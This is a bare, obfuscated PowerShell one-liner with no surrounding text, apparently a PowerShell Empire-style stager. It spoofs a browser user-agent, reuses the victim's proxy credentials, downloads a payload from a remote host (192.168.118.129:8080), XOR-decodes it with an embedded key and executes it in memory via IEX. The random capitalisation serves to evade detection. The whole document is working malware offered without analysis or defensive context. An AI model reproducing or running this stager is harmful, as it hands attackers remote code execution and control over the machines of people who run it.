
$wc=NEw-ObjECt SYStem.NET.WEBCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEADErs.Add('User-Agent',$u);$WC.PROXy = [SySTEm.Net.WeBReQUEsT]::DeFAUlTWebPRoXY;$Wc.ProXY.CReDENTiaLs = [SysTeM.NEt.CREDEnTialCaChe]::DefaultNEtwOrkCREDEntIALS;$K='7b24afc8bc80e548d66c4e7ff72171c5';$i=0;[ChaR[]]$b=([CHaR[]]($Wc.DOWNLoAdSTriNg("http://192.168.118.129:8080/index.asp")))|%{$_-bXor$K[$i++%$k.LenGtH]};IEX ($B-Join'')

